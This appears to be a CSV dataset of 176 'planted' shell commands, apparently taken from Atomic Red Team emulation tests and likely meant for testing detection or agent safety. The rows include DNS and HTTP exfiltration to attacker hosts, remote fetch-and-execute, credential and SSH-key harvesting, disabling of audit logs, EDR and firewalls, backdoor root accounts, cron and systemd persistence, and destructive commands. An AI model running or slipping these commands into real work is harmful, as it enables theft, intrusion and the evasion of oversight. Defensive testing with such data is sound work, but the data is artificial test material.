@@ -1,0 +1,201 @@
+id,planted_command
+H001,"dig @#{attacker_dns_server} -p #{dns_port} $(echo ""#{secret_info}"" | base64).google.com"
+H002,rm #{history_path}
+H003,uname -a >> #{output_file} && if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi && if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi && if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi && if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi && uptime >> #{output_file} && cat #{output_file} 2>/dev/null
+H004,"1. On the adversary machine run the below command. && tshark -f ""udp port 53"" -Y ""dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\"".domain\\"""" >> received_data.txt && 2. On the victim machine run the below commands. && xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done && 3. Once the data is received, use the below command to recover the data. && cat output_file | cut -d ""A"" -f 2 | cut -d "" "" -f 2 | cut -d ""."" -f 1 | sort | uniq | xxd -p -r"
+H005,tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}
+H006,"find #{file_path}/.aws -name ""credentials"" -type f 2>/dev/null"
+H007,"cd $HOME && find . -print | sed -e '""'""'s;[^/]*/;|__;g;s;__|; |;g'""'""' > #{output_file} && if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi; && find . -type f -iname *.pdf >> #{output_file} && cat #{output_file} && find . -type f -name "".*"""
+H008,kill -SIGTERM $(pgrep #{process_name})
+H009,tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}
+H010,cat /etc/passwd > #{output_file} && cat #{output_file}
+H011,cat /dev/null > /var/log/messages #truncating the file to zero bytes && cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)
+H012,mdatp config real-time-protection --value disabled
+H013,bash -lc env
+H014,echo -n 111-11-1111 | base64 && curl -XPOST #{base64_data}.#{destination_url}
+H015,"if [ -f ""/etc/#{syslog_config_file_name}"" ]; && then sed -i '""'""'$ a #art_test_1562_006_2'""'""' /etc/#{syslog_config_file_name} && fi && if [ -f ""/etc/#{rsyslog_config_file_name}"" ]; && then sed -i '""'""'$ a #art_test_1562_006_2'""'""' /etc/#{rsyslog_config_file_name} && fi && if [ -f ""/etc/syslog-ng/#{syslog_ng_config_file_name}"" ]; && then sed -i '""'""'$ a #art_test_1562_006_2'""'""' /etc/syslog-ng/#{syslog_ng_config_file_name} && fi"
+H016,which_openssl=`which openssl` && $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} && $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} && $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
+H017,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false && Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass} && Get-AdvancedSetting -Entity #{vm_host} -Name '""'""'Security.AccountLockFailures'""'""' | Set-AdvancedSetting -Value '""'""'0'""'""' -Confirm:$false && Disconnect-VIServer -Confirm:$false"
+H018,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz"
+H019,cat /etc/passwd |grep nobody && pw usermod nobody -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user nobody -h 0 && su nobody && whoami && exit
+H020,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf && grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf"
+H021,cp #{payload} /tmp/hello.c &&  chown root /tmp/hello.c &&  make /tmp/hello &&  chown root /tmp/hello &&  chmod u+s /tmp/hello && /tmp/hello
+H022,unset HISTFILE && export HISTFILESIZE=0 && history -c
+H023,touch -a -t 197001010000.00 #{target_filename}
+H024,iptables-save > /tmp/iptables.rules && iptables -F
+H025,"echo ""#!/bin/bash"" > /etc/init.d/T1543.002 && echo ""### BEGIN INIT INFO"" >> /etc/init.d/T1543.002 && echo ""# Provides : Atomic Test T1543.002"" >> /etc/init.d/T1543.002 && echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002 && echo ""# Required-Stop : "" >> /etc/init.d/T1543.002 && echo ""# Default-Start: 2 3 4 5"" >> /etc/init.d/T1543.002 && echo ""# Default-Stop: "" >> /etc/init.d/T1543.002 && echo ""# Short Description: Atomic Test for Systemd Service Creation"" >> /etc/init.d/T1543.002 && echo ""### END INIT INFO"" >> /etc/init.d/T1543.002 && echo ""python3 -c \""import os, base64;exec(base64.b64decode('""'""'aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'""'""')) \"" "" >> /etc/init.d/T1543.002 && chmod +x /etc/init.d/T1543.002 && if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i '""'""'ID=""centos""'""'""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi && systemctl enable T1543.002 && systemctl start T1543.002 && echo ""python3 -c \""import os, base64;exec(base64.b64decode('""'""'aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='""'""'))\"""" |  tee -a /etc/init.d/T1543.002 && systemctl daemon-reload && systemctl restart T1543.002"
+H026,"echo '""'""'#{text_to_append}'""'""' >> /etc/profile.d/bash_completion.sh"
+H027,halt -p
+H028,find /usr/bin -perm -2000
+H029,"crontab -l > /tmp/notevil && echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}"
+H030,chmod -R #{numeric_mode} #{file_or_folder}
+H031,nmap -sS #{network_range} -p #{port} && telnet #{host} #{port} && nc -nv #{host} #{port}
+H032,swapon -a && sleep 2 && swapoff -a && sync
+H033,echo 1> /proc/sys/kernel/sysrq && echo b> /proc/sysrq-trigger
+H034,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
+H035,chmod +x #{autosuid} && bash #{autosuid}
+H036,rm #{history_path}
+H037,"bash -c '""'""'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'""'""'"
+H038,"ENCODED=$(echo '""'""'#{message}'""'""' | xxd -ps -c 256) && printf $ENCODED | xxd -r -p && echo $ENCODED | xxd -r -p && echo $(echo $ENCODED) | xxd -r -p && echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file} && echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file} && echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p && echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p"
+H039,#{compiled_file} #{source_file}
+H040,systemctl stop ufw
+H041,"password=$(openssl passwd -1 art) && ([ ""$(uname)"" = '""'""'Linux'""'""' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c ""whoami; exit"""
+H042,useradd -M -N -r -s /bin/bash -c evil_account #{username}
+H043,bash -lc hostname
+H044,"echo ""dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif && echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif && ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif"
+H045,truncate -s +1 #{file_to_pad} #adds a byte to the file size
+H046,lsmod && kmod list && grep vmw /proc/modules
+H047,"password=$(openssl passwd -1 art) && ([ ""$(uname)"" = '""'""'Linux'""'""' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c ""whoami; exit"""
+H048,"dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '""'""'{print $5}'""'""') iflag=count_bytes"
+H049,"[ ""$(uname)"" = '""'""'FreeBSD'""'""' ] && cmd=""lastlogin"" || cmd=""lastlog"" && $cmd > #{output_file} && cat #{output_file}"
+H050,"sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
+H051,ping -c #{ping_count} 8.8.8.8 > /dev/null && #{evil_command}
+H052,#{program_path} -4 -p 6 -t 3
+H053,"echo ""[Unit]"" > #{path_to_systemd_service} && echo ""Description=Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_service} && echo ""[Service]"" >> #{path_to_systemd_service} && echo ""Type=simple"" >> #{path_to_systemd_service} && echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> #{path_to_systemd_service} && echo ""[Install]"" >> #{path_to_systemd_service} && echo ""WantedBy=multi-user.target"" >> #{path_to_systemd_service} && echo ""[Unit]"" > #{path_to_systemd_timer} && echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_timer} && echo ""Requires=#{systemd_service_name}"" >> #{path_to_systemd_timer} && echo ""[Timer]"" >> #{path_to_systemd_timer} && echo ""Unit=#{systemd_service_name}"" >> #{path_to_systemd_timer} && echo ""OnCalendar=*-*-* *:*:00"" >> #{path_to_systemd_timer} && echo ""[Install]"" >> #{path_to_systemd_timer} && echo ""WantedBy=timers.target"" >> #{path_to_systemd_timer} && systemctl start #{systemd_timer_name} && systemctl enable #{systemd_timer_name} && systemctl daemon-reload"
+H054,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
+H055,"ls -a >> #{output_file} && if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi; && file */* *>> #{output_file} && cat #{output_file} 2>/dev/null && find . -type f && ls -R | grep "":$"" | sed -e '""'""'s/:$//'""'""' -e '""'""'s/[^-][^\/]*\//--/g'""'""' -e '""'""'s/^/ /'""'""' -e '""'""'s/-/|/'""'""' && locate * && which sh"
+H056,"cp -v /etc/pam.d/sshd /tmp/ && echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> /etc/pam.d/sshd && systemctl restart sshd && systemctl restart auditd && ssh #{user_account}@localhost && whoami &&  su && whoami && exit && exit"
+H057,"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/ && for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o '""'""'StrictHostKeyChecking=no'""'""' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
+H058,touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod g+xs #{file_to_setuid}
+H059,set +o history
+H060,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf && grep ""# THIS IS A COMMENT"" /etc/ufw/sysctl.conf"
+H061,"filename='""'""'/etc/rc.local'""'""';if [ ! -f $filename ];then  touch $filename;else  cp $filename /etc/rc.local.original;fi && [ ""$(uname)"" = '""'""'FreeBSD'""'""' ] && alias python3=python3.9 && printf '""'""'#\!/usr/local/bin/bash'""'""' |  tee /etc/rc.local || printf '""'""'#!/bin/bash'""'""' |  tee /etc/rc.local && echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('""'""'aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='""'""'))\"""" |  tee -a /etc/rc.local && printf '""'""'exit 0'""'""' |  tee -a /etc/rc.local &&  chmod +x /etc/rc.local"
+H062,mkdir #{output_folder} && find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \; && exit 0
+H063,insmod #{module_path}
+H064,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules && grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules"
+H065,"if [ -f ""/etc/#{syslog_config_file_name}"" ]; && then echo '""'""'#art_test_1562_006_2'""'""' >> /etc/#{syslog_config_file_name} && fi"
+H066,rm #{history_path}
+H067,ufw disable
+H068,"find #{file_path}/.aws -name ""credentials"" -type f 2>/dev/null"
+H069,"cp /bin/sh /tmp/crond; && echo '""'""'sleep 5'""'""' | /tmp/crond"
+H070,#{compiled_file} #{source_file}
+H071,find #{search_path} -name id_rsa 2>/dev/null >> #{output_file} && exit 0
+H072,netstat -r | grep default
+H073,mkdir #{output_folder} && find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \; && exit 0
+H074,touch -a -t 197001010000.00 #{target_filename}
+H075,tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}
+H076,"systemd-run --user --unit=Atomic-Red-Team --on-calendar '""'""'*:0/1'""'""' /bin/sh -c '""'""'echo ""$(date) $(whoami)"" >>/tmp/log'""'""'"
+H077,#{program_path} -i #{ifname} -t 3
+H078,"find #{file_path}/.aws -name ""credentials"" -type f 2>/dev/null"
+H079,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf && grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf"
+H080,export HISTSIZE=0 && #{evil_command}
+H081,chown -R #{owner} #{file_or_folder}
+H082,#{program_path} -a -f -t 3
+H083,uname -srm
+H084,touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod u+xs #{file_to_setuid}
+H085,"crontab -l > /tmp/notevil && echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}"
+H086,"echo ""b"" > /proc/sysrq-trigger"
+H087,sockstat -4 && sockstat -6 2>/dev/null || true && sockstat -l 2>/dev/null || true
+H088,"find #{file_path}/.oci/sessions -name ""token"" -type f 2>/dev/null"
+H089,"echo ""[*] Listing SysV init scripts (/etc/init.d):"" && if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi && echo && echo ""[*] Listing runlevel directories (/etc/rc*.d):"" && ls -ld /etc/rc*.d 2>/dev/null || echo ""No /etc/rc*.d directories found"""
+H090,rm -rf #{folder_to_delete}
+H091,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false && Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass} && Get-AdvancedSetting -Entity #{vm_host} -Name '""'""'Security.AccountLockFailures'""'""' | Set-AdvancedSetting -Value '""'""'0'""'""' -Confirm:$false && Disconnect-VIServer -Confirm:$false"
+H092,rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
+H093,"echo $HISTSIZE && export HISTSIZE=0 && echo ""runnning some commands to populate the history"" && whoami && groups && if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH"";  fi"
+H094,ufw disable
+H095,chown -R #{owner}:#{group} #{file_or_folder}
+H096,nmap -sS #{network_range} -p #{port} && telnet #{host} #{port} && nc -nv #{host} #{port}
+H097,nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &
+H098,"pw useradd #{username} -g 0 -d /root -s /bin/sh && echo ""#{password}"" | pw usermod #{username} -h 0"
+H099,"[ ""$(uname)"" = '""'""'FreeBSD'""'""' ] && alias python3=python3.9 && if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi"
+H100,"echo $HISTSIZE && export HISTSIZE=0 && echo ""runnning some commands to populate the history"" && whoami && groups && if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH"";  fi"
+H101,find /usr/bin -perm -4000
+H102,"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f - && pfctl -a pf-rules -s rules"
+H103,auditctl -e 0
+H104,"1. export HISTCONTROL=ignoreboth && 2. echo export ""HISTCONTROL=ignoreboth"" >> ~/.bash_profile && 3. ls && 4. whoami > recon.txt"
+H105,"which_python=$(which python || which python3 || which python3.9 || which python2) && $which_python -c '""'""'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'""'""'"
+H106,#{program_path} -f -i #{ifname} -t 3
+H107,touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod g+xs #{file_to_setuid}
+H108,"1. Victim System Configuration: && mkdir /tmp/victim-staging-area && echo ""this file will be exfiltrated"" > /tmp/victim-staging-area/victim-file.txt && 2. Using Python to establish a one-line HTTP server on victim system: && cd /tmp/victim-staging-area && python -m SimpleHTTPServer 1337 && 3. To retrieve the data from an adversary system: && wget http://VICTIM_IP:1337/victim-file.txt"
+H109,xwd -root -out #{output_file} && xwud -in #{output_file}
+H110,"kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '""'""'--- package.json before install ---'""'""' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '""'""'--- package.json after install ---'""'""' && cat package.json"""
+H111,export HISTCONTROL=ignoreboth && #{evil_command}
+H112,"pw useradd #{username} -g 0 -d /root -s /bin/sh && echo ""#{password}"" | pw usermod #{username} -h 0"
+H113,cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
+H114,nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &
+H115,"arp -a | grep -v '""'""'^?'""'""'"
+H116,history -c
+H117,"wget --post-file=""#{input_file}"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after"
+H118,xwd -root -out #{output_file} && xwud -in #{output_file}
+H119,rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
+H120,touch #{file_to_setcap} &&  setcap cap_setuid=ep #{file_to_setcap}
+H121,touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod u+xs #{file_to_setuid}
+H122,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi"
+H123,systemctl stop falcon-sensor.service &&  systemctl disable falcon-sensor.service
+H124,export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port} && curl #{test_url}
+H125,"echo ""#{command}"" > /etc/cron.daily/#{cron_script_name} && echo ""#{command}"" > /etc/cron.hourly/#{cron_script_name} && echo ""#{command}"" > /etc/cron.monthly/#{cron_script_name} && echo ""#{command}"" > /etc/cron.weekly/#{cron_script_name}"
+H126,tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}
+H127,ip neighbour show
+H128,touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod g+xs #{file_to_setuid}
+H129,"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done"
+H130,"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b ""CN=Users,DC=#{domain},DC=#{top_level_domain}"" ""(objectClass=group)"" -s sub -a always -z 1000 dn"
+H131,#{compiled_file} /tmp/ T1222002
+H132,gcc #{input_file} && ./a.out && clang #{input_file} && ./a.out
+H133,bash -lc reboot
+H134,"echo ""#{at_command}"" | at #{time_spec}"
+H135,poweroff --reboot
+H136,netstat && who -a
+H137,unlink /var/log/messages
+H138,scp #{local_file} #{username}@#{remote_host}:#{remote_path}
+H139,touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod g+xs #{file_to_setuid}
+H140,sysctl -w kernel.randomize_va_space=0
+H141,echo 0> #{log_path}
+H142,find /usr/bin -perm -4000
+H143,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi"
+H144,LD_PRELOAD=#{path_to_shared_library} ls
+H145,halt -p
+H146,cp #{payload} /tmp/hello.c &&  chown root /tmp/hello.c &&  make /tmp/hello &&  chown root /tmp/hello &&  chmod u+s /tmp/hello && /tmp/hello
+H147,echo -n 111-11-1111 | b64encode -r - && curl -XPOST #{base64_data}.#{destination_url}
+H148,chown #{owner} #{file_or_folder}
+H149,"PS2=`logger -t ""$USER"" -f ~/.sh_history` && $PS2 && tail /var/log/messages"
+H150,"password=$(openssl passwd -1 art) && ([ ""$(uname)"" = '""'""'Linux'""'""' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c ""whoami; exit"""
+H151,"unamestr=$(uname) && if [ ""$unamestr"" = '""'""'Linux'""'""' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = '""'""'FreeBSD'""'""' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi"
+H152,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi; && if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi; && if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi; && if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi; && if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi; && cat /etc/group"
+H153,"echo '""'""'#{text_to_append}'""'""' >> /etc/profile"
+H154,systemctl stop systemd-journald #disables journal logging
+H155,"curl -F '""'""'file=@#{input_file}'""'""' -F '""'""'maxDownloads=1'""'""' -F '""'""'autoDelete=true'""'""' https://file.io/"
+H156,tar -cvzf #{output_file} #{input_file_folder}
+H157,"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine && $awsAccessKey = ""#{aws_access_key}"" && $awsSecretKey = ""#{aws_secret_key}"" && cd PathToAtomicsFolder/T1567.002/src/ && if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") { && $env:AWS_PROFILE = ""#{aws_profile}"" && } else { && $env:AWS_ACCESS_KEY_ID = ""$awsAccessKey"" && $env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey"" && } && $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init && $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var ""aws_region=#{aws_region}"" -auto-approve && Write-Host ""Done!"" && Write-Host ""Generating rclone config... "" -NoNewLine && $config = @"" && [exfils3] && type = s3 && provider = AWS && env_auth = true && region = #{aws_region} && ""@ && $config | Out-File -FilePath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"" -Encoding ascii && Write-Host ""Done!"" && Write-Host ""Exfiltrating data... "" -NoNewLine && $bucket = ""$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)"".Replace(""`"""","""") && cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v* && $null = ./rclone copy --max-size 1700k ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"" exfils3:$bucket --config ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"" && Write-Host ""Done!"""
+H158,if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi
+H159,"[ ""$(uname)"" = '""'""'FreeBSD'""'""' ] && alias python3=python3.9 && if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi"
+H160,passwd #{user_account} #enter admin password > enter new password > confirm new password
+H161,localectl status
+H162,chmod #{numeric_mode} #{file_or_folder}
+H163,"if  test -f /etc/pam.d/password-auth; then  cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; && if  test -f /etc/pam.d/system-auth; then  cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; &&  touch /tmp/password-auth.bk &&  touch /tmp/system-auth.bk  echo ""session    required    pam_tty_audit.so && enable=* log_password"" >> /etc/pam.d/password-auth  echo ""session    required    pam_tty_audit.so && enable=* log_password"" >> /etc/pam.d/system-auth"
+H164,busybox sh &
+H165,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi"
+H166,"echo ""dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif && echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif && ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif"
+H167,cat /etc/passwd |grep nobody && pw usermod nobody -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user nobody -h 0 && su nobody && whoami && exit
+H168,unset HISTFILE && export HISTFILESIZE=0 && history -c
+H169,pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
+H170,"ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('""'""'#{message}'""'""'));"") && perl -le ""use MIME::Base64;print(decode_base64('""'""'$ENCODED'""'""'));"" && echo $ENCODED | perl -le '""'""'use MIME::Base64;print(decode_base64(<STDIN>));'""'""' && echo $ENCODED > #{encoded_file} && perl -le '""'""'use MIME::Base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'""'""'"
+H171,"echo ""[Unit]"" > #{path_to_systemd_service} && echo ""Description=Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_service} && echo ""[Service]"" >> #{path_to_systemd_service} && echo ""Type=simple"" >> #{path_to_systemd_service} && echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> #{path_to_systemd_service} && echo ""[Install]"" >> #{path_to_systemd_service} && echo ""WantedBy=multi-user.target"" >> #{path_to_systemd_service} && echo ""[Unit]"" > #{path_to_systemd_timer} && echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_timer} && echo ""Requires=#{systemd_service_name}"" >> #{path_to_systemd_timer} && echo ""[Timer]"" >> #{path_to_systemd_timer} && echo ""Unit=#{systemd_service_name}"" >> #{path_to_systemd_timer} && echo ""OnCalendar=*-*-* *:*:00"" >> #{path_to_systemd_timer} && echo ""[Install]"" >> #{path_to_systemd_timer} && echo ""WantedBy=timers.target"" >> #{path_to_systemd_timer} && systemctl start #{systemd_timer_name} && systemctl enable #{systemd_timer_name} && systemctl daemon-reload"
+H172,"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*"
+H173,tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}
+H174,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
+H175,"systemd-run --user --unit=Atomic-Red-Team --on-calendar '""'""'*:0/1'""'""' /bin/sh -c '""'""'echo ""$(date) $(whoami)"" >>/tmp/log'""'""'"
+H176,"echo '""'""'#\!/bin/sh'""'""' > #{rc_service_path}/#{rc_service_file} && echo '""'""' '""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'#'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'# PROVIDE: art-test'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'# REQUIRE: LOGIN'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'# KEYWORD: shutdown'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""' '""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'. /etc/rc.subr'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""' '""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'name=""art_test""'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'rcvar=art_test_enable'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'load_rc_config ${name}'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'command=""/usr/bin/touch""'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'start_cmd=""art_test_start""'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""''""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'art_test_start()'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'{'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'  ${command} /tmp/art-test.marker'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'}'""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""' '""'""' >> #{rc_service_path}/#{rc_service_file} && echo '""'""'run_rc_command ""$1""'""'""' >> #{rc_service_path}/#{rc_service_file} && chmod +x #{rc_service_path}/#{rc_service_file} && service art-test enable && service art-test start"
